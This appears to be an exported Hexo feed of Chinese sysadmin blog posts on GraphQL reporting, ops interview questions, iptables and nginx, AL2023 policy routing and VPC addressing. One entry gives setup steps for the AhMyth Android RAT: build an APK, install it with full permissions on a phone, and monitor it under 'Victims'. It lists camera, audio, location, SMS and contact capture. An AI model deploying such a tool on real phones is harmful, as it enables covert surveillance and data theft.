class="line"></span><br><span class="line"><span class="comment">// 执行查询并生成工作周报</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generateWeeklyReport</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; startDate, endDate &#125; = <span class="title function_">getLastWeekDates</span>(); <span class="comment">// 调用函数获取上周日期范围</span></span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> graphQLClient.<span class="title function_">rawRequest</span>(queryLastWeekWork);</span><br><span class="line">    <span class="keyword">const</span> tasks = response.<span class="property">data</span>.<span class="property">viewer</span>.<span class="property">assignedIssues</span>.<span class="property">nodes</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;工作周报：\n&#x27;</span>);</span><br><span class="line">    tasks.<span class="title function_">forEach</span>(<span class="function">(<span class="params">task</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`- [<span class="subst">$&#123;task.title&#125;</span>](<span class="subst">$&#123;task.url&#125;</span>) 完成于 <span class="subst">$&#123;task.completedAt&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;生成工作周报时出错：&#x27;</span>, error);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把以上代码存为文件：<code>linear.js</code>，再用 Node.Js 来跑一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node linear.js</span><br></pre></td></tr></table></figure>

<p>周报出炉！</p>
]]></content>
      <tags>
        <tag>linear.app</tag>
        <tag>SDK</tag>
        <tag>TypeScript</tag>
        <tag>JavaScript</tag>
        <tag>Node.Js</tag>
        <tag>GraphQL</tag>
      </tags>
  </entry>
  <entry>
    <title>问运维团队 leader 的一些（技术）问题</title>
    <url>/2021/06/%E9%97%AE%E8%BF%90%E7%BB%B4%E5%9B%A2%E9%98%9F%20leader%20%E7%9A%84%E4%B8%80%E4%BA%9B%EF%BC%88%E6%8A%80%E6%9C%AF%EF%BC%89%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近去北京出了一趟差，结果一去就被总部抓差到总部运维团队那里帮了两个星期（其实不止两个星期）的忙，说是帮忙其实算不上，应该说我是被抓丁参与了一个大的“项目”。</p>
<span id="more"></span>

<p>这个项目就是帮助梳理运维团队现在的为了 sla 和（成本）压降的方案，并参与帮他们招一个 leader，50+ 团队的 leader，一个运维总监。</p>
<p>这里我重点是说我参与面试运维总监的这个事儿，这么高 level 的岗位，拉我一工程师来参与面试，能聊什么呢？于是我非常自觉地把我的时间缩到 30 分钟之内，同时又在运维工作的一些方向上各找了几个简单基础的细节问题，打算试试这些大佬候选人的基础成色。</p>
<h2 id="我的问题及效果"><a href="#我的问题及效果" class="headerlink" title="我的问题及效果"></a>我的问题及效果</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>首先我聊的是 Linux 发行版，再聊 kernel 版本，这也不是每个人都聊的，要看其简历上是否有过 Linux 系统管理员的经验，到这里有人就已经毛了。</p>
<p>大家基本上都是红帽系：CentOS 用的比较多，但当我引出来红帽系（就说 CentOS 吧）的 kernel 版本不标准，他们把好多高版本的特性 backport 到老（低）版本。其实这个就有点流氓，Linux 主要是是指 kernel，结果你 CentOS 里 uname 看到的版本跟别的版本看到的不是一回事。关于这个事情，没有一个候选人意识到过。</p>
<h4 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h4><h5 id="孤儿进程和僵尸进程是什么？应该怎么处理？"><a href="#孤儿进程和僵尸进程是什么？应该怎么处理？" class="headerlink" title="孤儿进程和僵尸进程是什么？应该怎么处理？"></a>孤儿进程和僵尸进程是什么？应该怎么处理？</h5><p>本想如果能聊，再问问 daemon 程序呢。结果，没有一个人能有机会让我扯出 daemon 的问题。</p>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><h5 id="Linux-文件系统中的软链接和硬链接，有啥区别，占硬盘空间吗？"><a href="#Linux-文件系统中的软链接和硬链接，有啥区别，占硬盘空间吗？" class="headerlink" title="Linux 文件系统中的软链接和硬链接，有啥区别，占硬盘空间吗？"></a>Linux 文件系统中的软链接和硬链接，有啥区别，占硬盘空间吗？</h5><p>结果是：大都知道软链接，也大致知道其特点，但对硬链接了解不多，对后面的问题自然也就不清楚了。</p>
<h4 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h4><p>这个没问</p>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><h4 id="rfc1918-中定义的-Private-Address-Space"><a href="#rfc1918-中定义的-Private-Address-Space" class="headerlink" title="rfc1918 中定义的 Private Address Space"></a>rfc1918 中定义的 Private Address Space</h4><p>成想有张口就来的再问问 100.64 的事情的，结果，就这几个段的地址，没有一个候选人能准确无误的回答出来，当然，也还是有好几位只是也许是口误说 172.16.0.0-172.32. 而在我的提示下马上又更正了。<br>这个问题我要求完全准确其实可能要求有点高，像那几位仅是 172.16. 那个段口误的，基本上来说可以得满分了。但我但凡说起 100.64. 这个段的事情，无人知晓</p>
<h4 id="OSI-七层模型中的二层（链路层）、三层（网络层）、四层（传输层）、七层（应用层）分别是什么？有啥区别？有什么协议？"><a href="#OSI-七层模型中的二层（链路层）、三层（网络层）、四层（传输层）、七层（应用层）分别是什么？有啥区别？有什么协议？" class="headerlink" title="OSI 七层模型中的二层（链路层）、三层（网络层）、四层（传输层）、七层（应用层）分别是什么？有啥区别？有什么协议？"></a>OSI 七层模型中的二层（链路层）、三层（网络层）、四层（传输层）、七层（应用层）分别是什么？有啥区别？有什么协议？</h4><p>这个问题相对答得好一点。</p>
<h3 id="安全相关（或者说是应用）"><a href="#安全相关（或者说是应用）" class="headerlink" title="安全相关（或者说是应用）"></a>安全相关（或者说是应用）</h3><h4 id="HTTPs"><a href="#HTTPs" class="headerlink" title="HTTPs"></a>HTTPs</h4><p>几乎没有候选人知道客户端和服务器是怎么交互的，当然不知道也是正常的，当然我就诱导，HTTPs 是怎样保证安全（当然杠精这里可以怼我说 HTTPs 并不能保证安全）的呢？然后又说起对成加密和非对称加密，我问在 HTTPs 客户端和服务器的交互中用到了对称加密和非对称加密了吗？用到的话是哪里用到了？</p>
<p>结果：全军覆没。</p>
<p>可能是现在主流把安全团队从运维团队里划出去的后遗症吧。</p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>这个也没问，这个其实可以挑个简单的问题问下：比如说索引为什么会加快查询的速度什么的</p>
<h3 id="公有云"><a href="#公有云" class="headerlink" title="公有云"></a>公有云</h3><p>我准备问的问题是 AWS 里 VPC 中 public subnet 和 private subnet 的区别，这个也没普遍问，因为很多都没用过 AWS，而且，这个问题对于整个团队的大领导来说的确太琐碎太细了，如果没有做过基于 aws 的相关架构设计啥的具体工作的，的确都不一定知道。</p>
<h3 id="kubernetes"><a href="#kubernetes" class="headerlink" title="kubernetes"></a>kubernetes</h3><p>我想问的是暴露服务到集群外的方式，居然有很多人不知道，那我只能评价说他完全不懂 kubernetes，当然，也有人能完全答对的。</p>
<p>更有意思的是，有人能答出这几种方式，但当我追问 ingress 方式到底是怎样实现将服务暴露出去的呢？被我问住了，我感觉这典型就是不求甚解，学（kubernetes）的时候并没有带脑袋去想，而只是说我要背下来。</p>
<h3 id="逻辑思维（概率相关）"><a href="#逻辑思维（概率相关）" class="headerlink" title="逻辑思维（概率相关）"></a>逻辑思维（概率相关）</h3><p>这种题我准备了两道：</p>
<ul>
<li>已知函数 r64 会按百分之六十和百分之四十的概率返回整数 0 和 1，求函数 r55 使其按百分之五十和百分之五十的概率返回整数 0 和 1。</li>
<li>已知函数 r2，会按同样的概率返回整数 0 和 1，求函数 r3，使其按同样的概率返回整数 0、1 和 2</li>
</ul>
<p>准确讲，这两个题都不难，难得是这样突然袭击候选人完全没准备可能会蒙，所以，我其实只是想知道大致的思路。结论：5 分钟之类没有人答对的，无论是第一题还是第二题。原本想第二题如果有人答得好再引申问下知道 r<sub>n</sub>，求 r<sub>m</sub>（n, m 都是正整数），但遗憾的是，没有人让我有机会聊这些……</p>
]]></content>
      <tags>
        <tag>interview</tag>
        <tag>rfc1918</tag>
        <tag>tcp/ip</tag>
        <tag>孤儿进程</tag>
        <tag>僵尸进程</tag>
        <tag>运维总监</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title>面试之查漏补缺</title>
    <url>/2020/09/%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E7%82%B9%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/index.html</url>
    <content><![CDATA[<p>乍一看，题都不难，但手生了后好多不看 manual 都生写不出来。</p>
<p>没啥可说的，直接上问题。</p>
<span id="more"></span>

<h2 id="找出文件中空行的行号"><a href="#找出文件中空行的行号" class="headerlink" title="找出文件中空行的行号"></a>找出文件中空行的行号</h2><p>答：用 grep 配合参数 -n 显示行号，具体命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -n <span class="string">&quot;^$&quot;</span> file</span><br></pre></td></tr></table></figure>

<h2 id="把文件中所有的换行替换成空格"><a href="#把文件中所有的换行替换成空格" class="headerlink" title="把文件中所有的换行替换成空格"></a>把文件中所有的换行替换成空格</h2><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>答：用 sed 命令来把文件合成一行以后再替换，详见命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -e <span class="string">&#x27;1h;2,$H;$!d;g;s/\n/ /g&#x27;</span> file</span><br></pre></td></tr></table></figure>

<h3 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h3><p>答：用 tr 命令替换 ‘\n’ 为 ‘ ‘，详见命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27; &#x27;</span> &lt; file | sed <span class="string">&#x27;s/ $/\n/&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="查看状态是-established-的连接"><a href="#查看状态是-established-的连接" class="headerlink" title="查看状态是 established 的连接"></a>查看状态是 established 的连接</h2><p>答：用 ss 命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -t state established</span><br></pre></td></tr></table></figure>

<h2 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h2><p>规则要求：</p>
<ul>
<li>对所有地址开放本服务器的80端口、10~20端口。</li>
<li>其他机器可以用ping命令来探测本服务器的链接情况</li>
<li>其他没有被准许的端口将禁止访问</li>
</ul>
<p>答：用 iptables，具体如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m multiport --dports 10:20,80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT</span><br><span class="line">iptables -A INPUT -j REJECT</span><br></pre></td></tr></table></figure>

<h2 id="Nginx-优化配置点"><a href="#Nginx-优化配置点" class="headerlink" title="Nginx 优化配置点"></a>Nginx 优化配置点</h2><h3 id="work-processes"><a href="#work-processes" class="headerlink" title="work processes"></a>work processes</h3><h4 id="worker-processes"><a href="#worker-processes" class="headerlink" title="worker_processes"></a>worker_processes</h4><p>Nginx worker 的进程数，缺省为 1；推荐设为 auto，将实现每颗 cpu 核跑一个 worker 进程</p>
<h4 id="worker-connections"><a href="#worker-connections" class="headerlink" title="worker_connections"></a>worker_connections</h4><p>每个 worker 进程可以同时处理的最大连接数。</p>
<h3 id="Keepalive-Connections"><a href="#Keepalive-Connections" class="headerlink" title="Keepalive Connections"></a>Keepalive Connections</h3><h4 id="keepalive-requests"><a href="#keepalive-requests" class="headerlink" title="keepalive_requests"></a>keepalive_requests</h4><p>客户端可以通过单个 keepalive 连接进行的请求数，可以酌情调大。</p>
<h4 id="keepalive-timeout"><a href="#keepalive-timeout" class="headerlink" title="keepalive_timeout"></a>keepalive_timeout</h4><p>酌情调整</p>
<h4 id="keepalive"><a href="#keepalive" class="headerlink" title="keepalive"></a>keepalive</h4><p>每个 worker 进程保持与上游服务器 keepalive 的空闲连接数，注意，要启用这个，需要同时配置如下设置：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Connection <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile"></a>sendfile</h3><p>操作系统的 sendfile（） 系统调用将数据从一个文件描述符复制到另一个文件描述符，通常实现零复制，这可以加快 TCP 数据传输的速度</p>
<h3 id="caching"><a href="#caching" class="headerlink" title="caching"></a>caching</h3><p>启用缓存，您可以大大缩短对客户端的响应时间，同时可以大大减少后端服务器的负载</p>
<h3 id="compression"><a href="#compression" class="headerlink" title="compression"></a>compression</h3><p>压缩发送给客户端的响应可以大大减小客户端的大小，因此它们使用较少的网络带宽。需要注意的是：启用压缩会消耗 CPU 资源，如果服务器的 CPU 资源是瓶颈的话慎用。还有，本来已经压缩过的内容（如图片）不要启用</p>
<h2 id="MySQL-的联合索引"><a href="#MySQL-的联合索引" class="headerlink" title="MySQL 的联合索引"></a>MySQL 的联合索引</h2><p>联合索引又叫复合索引，是多个字段组成的一条索引。</p>
<ul>
<li>联合索引的最左前缀匹配是指 where 条件一定要有联合索引的第一个字段</li>
<li>是否走联合索引跟 where 条件的顺序无关</li>
<li>遇到范围查询(&gt;、&lt;、between、like)就会停止匹配</li>
</ul>
<h2 id="MySQL-的主从复制（同步）"><a href="#MySQL-的主从复制（同步）" class="headerlink" title="MySQL 的主从复制（同步）"></a>MySQL 的主从复制（同步）</h2><p>先决条件：</p>
<ol>
<li>master 上启用 binlog</li>
</ol>
<p>原理：</p>
<ol>
<li>master 上 binglog dump 线程将 binlog 的变化内容发给 slave</li>
<li>slave 上的 I&#x2F;O 线程收到 master 上发过来的 binlog 内容后，写入本地的 relay log</li>
<li>slave 上的 SQL 线程读取 relay log，并根据其内容回放到 slave</li>
</ol>
]]></content>
      <tags>
        <tag>sed</tag>
        <tag>tr</tag>
        <tag>iptables</tag>
        <tag>nginx</tag>
        <tag>ss</tag>
        <tag>grep</tag>
        <tag>MySQL</tag>
        <tag>联合索引</tag>
      </tags>
  </entry>
  <entry>
    <title>Amazon Linux 2023：Bug 还是特性？</title>
    <url>/2023/05/Amazon%20Linux%202023%EF%BC%9ABug%20%E8%BF%98%E6%98%AF%E7%89%B9%E6%80%A7%EF%BC%9F/index.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在 AWS 的一个 VPC 内部的一台 EC2 上搭了一个 OpenVPN 服务器，对，就是 <a href="/2023/02/%E4%BB%8E%20Client%20VPN%20endpoint%20%E8%BF%81%E7%A7%BB%E5%88%B0%20EC2%20%E4%B8%8A%E7%9A%84%20OpenVPN/index.html">从 Client VPN endpoint 迁移到 EC2 上的 OpenVPN</a> 提到的这件事。然后我有台 PC 通过 OpenVPN 客户端软件连了过来。以下是基本信息。</p>
<blockquote>
<p><strong><em>NOTE:</em></strong> IP 地址都不是实际真实情况</p>
</blockquote>
<ul>
<li>EC2（A）<ul>
<li>公网 IP：<code>1.1.1.1</code>（本地并没有，这个是防火墙或其他设备给做的一对一 map）</li>
<li>私网 IP：<code>10.0.0.2/24</code></li>
<li>私网网关：<code>10.0.0.1</code></li>
<li>私网网卡：enX0</li>
<li>tun 设备名：tun0</li>
<li>tun 设备 IP：<code>172.16.0.1/24</code></li>
</ul>
</li>
<li>PC（B）<ul>
<li>tun 设备名：tun0</li>
<li>tun 设备 IP：<code>172.16.0.2/24</code></li>
</ul>
</li>
</ul>
<span id="more"></span>

<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>问题的核心是：B 无法 ping 通 A 的私网 IP。换句话说，当我在 B 上执行 <code>ping 10.0.0.2</code> 命令时，无法得到响应。俗话就是 ping 不通 10.0.0.2。</p>
<h2 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h2><h3 id="初步排查"><a href="#初步排查" class="headerlink" title="初步排查"></a>初步排查</h3><p>我对 AWS EC2 的网络问题进行了深入的排查，包括各种路由表、安全组、网络 ACL，甚至本地的防火墙配置等等。然而，我并没有找到问题的所在。我可以访问 VPC 内部的私网里的 RDS 资源，也可以在 A 上明显看到有接收到数据包。</p>
<h3 id="ICMP-包的追踪"><a href="#ICMP-包的追踪" class="headerlink" title="ICMP 包的追踪"></a>ICMP 包的追踪</h3><p>我继续深入，发现在 A 上可以接收到 B 发送的 icmp 包，而且 A 也确实有回包，但是奇怪的是，回包并没有通过 tun0 设备，而是直接从 enX0 设备发送出去！</p>
<h3 id="不是路由的问题（？）"><a href="#不是路由的问题（？）" class="headerlink" title="不是路由的问题（？）"></a>不是路由的问题（？）</h3><p>马上怀疑本地路由有问题，直接在 A 上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip r get 172.16.0.2</span><br></pre></td></tr></table></figure>

<p>发现没问题呀，是从设备 tun0 走的呀？这下就完全把我给整不会了。再此之后，我还做了好些努力，比如：</p>
<h3 id="继续检测排查"><a href="#继续检测排查" class="headerlink" title="继续检测排查"></a>继续检测排查</h3><ul>
<li>在 A 上 ping B 的 VPN 地址（tun0 设备上）：<ul>
<li><code>ping 172.16.0.2</code>，当然是通的</li>
<li><code>ping -I 10.0.0.2 172.16.0.2</code>，这种指定源 IP 的方式 ping，当然是不通的，同样问题，听包发现包没往 tun0 设备上走，而是往 enX0 上走了</li>
</ul>
</li>
<li>跟各种 AI 掰扯，也被告知过 n 多需要检查的地方，比如 kernel 参数 rp_filter 啥的，都对，但都没啥意义，都查过 n 多遍了。</li>
<li>还在微信朋友圈里发了这个问题，看看朋友圈的卧龙凤雏有没有啥好一点的建议方法。回复基本上都有道理，但没有一个能给我灵感的。</li>
</ul>
<h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>多番努力，虽然没有结果，但是慢慢还是明白了问题所在就是为什么从 10.0.0.2 出去按路由表应该往 tun0 上走的包却走到了 enX0 上？“这还是路由的问题“，我盖棺定论。</p>
<p>老想想不出为什么，于是就上网找了找 Linux 高级路由的资料看了看，突然想起来：Linux 系统里，路由选择上比路由表级别更高的还有一个：路由策略！柳暗花明呀。</p>
<p>我立马起来，登录上 EC2，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip rule s</span><br></pre></td></tr></table></figure>

<p>果然有一条记录：</p>
<blockquote>
<p>10000:  from 10.0.0.2 lookup 10000 proto static</p>
</blockquote>
<p>果然有货，再接着看这条 id 是 10000 的路由表里有什么：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip r s table 10000</span><br></pre></td></tr></table></figure>

<p>系统显示：</p>
<blockquote>
<p>default via 10.0.0.1 dev enX0 proto dhcp metric 512<br>10.0.0.0&#x2F;24 dev enX0 proto static scope link</p>
</blockquote>
<p>这一下子逻辑就清晰了，源地址是 10.0.0.2、目标地址是 172.16.0.2 的数据包之所以会往 enX0 上走是因为路由策略 <code>10000:  from 10.0.0.2 lookup 10000 proto static</code>，这个策略规定了源地址是 10.0.0.2 的数据包怎么走要看路由表 10000，而在 10000 这张路由表又是这样的：</p>
<blockquote>
<p>default via 10.0.0.1 dev enX0 proto dhcp metric 512<br>10.0.0.0&#x2F;24 dev enX0 proto static scope link</p>
</blockquote>
<p>按照这个路由表，去往 172.16.0.2 的数据包不妥妥的要往 enX0 上发吗？</p>
<h2 id="问题验证"><a href="#问题验证" class="headerlink" title="问题验证"></a>问题验证</h2><p>最后，我还要做最后一个测试，以验证我的结论：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip r add 172.16.0.0/24 \</span><br><span class="line">    dev tun0 \</span><br><span class="line">    src 172.16.0.1 \</span><br><span class="line">    table 10000</span><br></pre></td></tr></table></figure>

<p>然后，那边在 B 上 <code>ping 10.0.0.2</code> 马上就通了。</p>
<p>最后的最后，我把刚加的这条路由删掉了，因为我还没想好要不要修以及怎么修这个问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip r del 172.16.0.0/24 table 10000</span><br></pre></td></tr></table></figure>

<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>由于 Amazon Linux 2023 中在策略路由里将从 EC2 私网地址为源地址的数据包强制走了另外一张路由表，在那张表里源地址为 EC2 私网地址的数据包会走 enX0，而我的 OpenVPN 服务启动时只修改了缺省的路由表：main，故而导致从 OpenVPN 的客户端不能通 EC2 的私网地址。</p>
<p>所以，这到底是 Amazon Linux 2023 的 bug 呢，还是 OpenVPN 的 bug 呢？这个问题还需要进一步的探讨和研究。</p>
]]></content>
      <tags>
        <tag>ip</tag>
        <tag>OpenVPN</tag>
        <tag>AWS</tag>
        <tag>AL2023</tag>
        <tag>Amazon Linux 2023</tag>
        <tag>EC2</tag>
        <tag>策略路由</tag>
        <tag>ping</tag>
        <tag>路由表</tag>
        <tag>rp_filter</tag>
      </tags>
  </entry>
  <entry>
    <title>Best Practices for VPC IP Address Allocation</title>
    <url>/2022/09/Best%20Practices%20for%20VPC%20IP%20Address%20Allocation/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>如今公有云用的越来越多，各个区域、不同可用区，还有各种特殊服务，再加上也许还有自建 IDC，还有办公网内网。我的传统是会将这些内网打通的。所以，各个节点网络的 IP 地址分配策略（方案）就成了一个绕不开的话题。</p>
<span id="more"></span>

<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><ul>
<li>region: 公有云厂商每个 region（我喜欢叫做节点）里可以创建多个 VPC</li>
<li>zone: 每个 region 会有三个或更多的可用区（zone），每个可用区可以看作是一个数据中心（IDC）</li>
<li>subnet: subnet(子网) 会在某个可用区（zone）里创建。</li>
</ul>
<h3 id="VPC-分配策略"><a href="#VPC-分配策略" class="headerlink" title="VPC 分配策略"></a>VPC 分配策略</h3><p>我常用的一些 VPC 创建管理策略：</p>
<ul>
<li>生产(Product)、测试(testing)和 Stage 环境（如果有的话）一般会单独一个 VPC</li>
<li>infrastracture 的相关机器（比如 Gitlab、VPN server、日志处理和监控报警等）也会一个单独的 VPC（规模相对较小）</li>
</ul>
<h3 id="VPC-下-subnet-的策略"><a href="#VPC-下-subnet-的策略" class="headerlink" title="VPC 下 subnet 的策略"></a>VPC 下 subnet 的策略</h3><ul>
<li>公有云厂商一般会建议每个 VPC 至少要跨两个可用区（为了冗余，避免某个可用区挂掉导致所有服务不可用），我一般会跨三个可用区。</li>
<li>公有云厂商会建议 VPC 下的子网（subnet）分成公网子网（配公网 IP）和私网子网（不配公网 IP）。</li>
</ul>
<h3 id="VPC-中的-IP-分配"><a href="#VPC-中的-IP-分配" class="headerlink" title="VPC 中的 IP 分配"></a>VPC 中的 IP 分配</h3><h4 id="私网地址"><a href="#私网地址" class="headerlink" title="私网地址"></a>私网地址</h4><p>这里指的是在 <a href="https://tools.ietf.org/html/rfc1918">RFC 1918</a> 里定义的“私有地址空间（Private Address Space）”，各大公有云厂商允许分配给 VPC 的 IP 地址只能是这其中的。</p>
<ol>
<li>10.0.0.0&#x2F;8（从 10.0.0.0 到 10.255.255.255）</li>
<li>172.16.0.0&#x2F;12（从 172.16.0.0 到 172.31.255.255）</li>
<li>192.168.0.0&#x2F;16（从 192.168.0.0 到 192.168.255.255）</li>
</ol>
<h4 id="VPC-和-subnet-的-IP-分配要求"><a href="#VPC-和-subnet-的-IP-分配要求" class="headerlink" title="VPC 和 subnet 的 IP 分配要求"></a>VPC 和 subnet 的 IP 分配要求</h4><ul>
<li>每个 VPC 要分一段（上面提到的）私网地址</li>
<li>VPC 下的每个 subnet 也要独占一段其 VPC 占有的私网地址中的一段</li>
</ul>
<h2 id="IP-分配策略"><a href="#IP-分配策略" class="headerlink" title="IP 分配策略"></a>IP 分配策略</h2><h3 id="VPC"><a href="#VPC" class="headerlink" title="VPC"></a>VPC</h3><ol>
<li>根据 VPC 的数量多少选用 10 段、172 段还是 192 段的 IP</li>
<li>每个 VPC 根据需求大小选一个或多个 C 段地址，当然更小也是可以的，比如半个 C 段（比如有些 infrastructure）。</li>
</ol>
<h3 id="subnet"><a href="#subnet" class="headerlink" title="subnet"></a>subnet</h3><p>以最简单的 VPC 配置四个 C 段地址为例（我常用是一个 VPC 两个 C 段），假设其是 <strong>10.0.0.0&#x2F;22</strong>（也就是 10.0.0.0&#x2F;24、10.0.1.0&#x2F;24、10.0.2.0&#x2F;24 和 10.0.3.0&#x2F;24 四个 C 段），那么：</p>
<p>找三个可用区，</p>
<ul>
<li>分别建立一个私网子网，分配 IP 地址段：<ul>
<li>10.0.0.0&#x2F;24</li>
<li>10.0.1.0&#x2F;24</li>
<li>10.0.2.0&#x2F;24</li>
</ul>
</li>
<li>分别建立一个公网子网，分配 IP 地址段：<ul>
<li>10.0.3.0&#x2F;26</li>
<li>10.0.3.64&#x2F;26</li>
<li>10.0.3.128&#x2F;26</li>
</ul>
</li>
</ul>
<p>可以看出这个 VPC 还剩一段 IP：10.0.3.192&#x2F;26，这一段就留作冗余。</p>
<p>注意：</p>
<ul>
<li>VPC 的 internet gateway 要放到公网子网里</li>
<li>VPC 的 SNAT 设备要放到公网子网里</li>
<li>VPC 的公网子网的 default gateway 指向的是 internet gateway</li>
<li>VPC 的私网子网的 default gateway 指向的是 SNAT 设备</li>
</ul>
<h2 id="待续"><a href="#待续" class="headerlink" title="待续"></a>待续</h2><p>本方案并没有考虑 IPv6 的情况，以后有机会更新的时候，会把 IPv6 的支持考虑进去。</p>
]]></content>
      <tags>
        <tag>VPC</tag>
        <tag>Best Practice</tag>
        <tag>Subnet</tag>
        <tag>IP Allocation</tag>
        <tag>公有云</tag>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title>手撸一个 Android 的 RAT(reote administration tool)</title>
    <url>/2020/03/Build%20RAT%20fon%20Android/index.html</url>
    <content><![CDATA[<h1 id="整一个-Android-的-RAT"><a href="#整一个-Android-的-RAT" class="headerlink" title="整一个 Android 的 RAT"></a>整一个 Android 的 RAT</h1><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>这个需求来源没法说，就是想找个 Android 手机的远程管理工具。</p>
<span id="more"></span>

<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="macOS-上"><a href="#macOS-上" class="headerlink" title="macOS 上"></a>macOS 上</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install electron -g;</span><br><span class="line">brew tap AdoptOpenJDK/openjdk;</span><br><span class="line">brew cask install adoptopenjdk8;</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/AhMyth/AhMyth-Android-RAT.git;</span><br><span class="line"><span class="built_in">cd</span> AhMyth-Android-RAT/AhMyth-Server;</span><br><span class="line">npm start;</span><br></pre></td></tr></table></figure>

<p>在弹出的页面里 build 一个 apk，再安装到要远程管理的 android 手机上，并执行之。注意：权限要给够，要常驻内存。</p>
<p>然后再在 Victims 里 listen 一下，应该就会看到刚装了那个 apk 的手机报上来的信息。</p>
<p>点击进去后，发现能调用摄像头照相、录音、获取位置、存取手机存储里的资料、获取联系人信息、获取短信、发送短信、获取通话记录。</p>
<p>问题也很明显：安装时提示软件不是为 Android 10 编写的，也许会有兼容性问题，当然，Andorid 10 上也是能跑的。</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>AhMyth</tag>
        <tag>RAT</tag>
        <tag>apk</tag>
      </tags>
  </entry>
  <entry>
    <title>Building a wiki using confluence via docker</title>
    <url>/2021/05/Building%20a%20wiki%20using%20confluence%20via%20docker/index.html</url>
    <content><![CDATA[<h1 id="用-docker-跑-confluence-来搭建-wiki-系统"><a href="#用-docker-跑-confluence-来搭建-wiki-系统" class="headerlink" title="用 docker 跑 confluence 来搭建 wiki 系统"></a>用 docker 跑 confluence 来搭建 wiki 系统</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>略。</p>
<h2 id="Steps-in-details"><a href="#Steps-in-details" class="headerlink" title="Steps in details"></a>Steps in details</h2><p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># postgresql db</span></span><br><span class="line">docker run \</span><br><span class="line">	--name postgresdb \</span><br><span class="line">	-v /app/wiki_dbdata:/var/lib/postgresql \</span><br><span class="line">	-p 5432:5432 \</span><br><span class="line">	-e POSTGRES_PASSWORD=1111111 \</span><br><span class="line">	-d postgres:13.3</span><br><span class="line"><span class="comment"># confluence</span></span><br><span class="line"><span class="comment"># 我这里的部署方法是在 confluence 前面有 LB 的</span></span><br><span class="line"><span class="comment"># 如果在没有 LB 的情况下，可以自己部署一台 nginx</span></span><br><span class="line"><span class="comment"># 在 443 端口起一个虚机 wiki.abc.com</span></span><br><span class="line"><span class="comment"># 反代请求到这台机器的 8090 端口（用 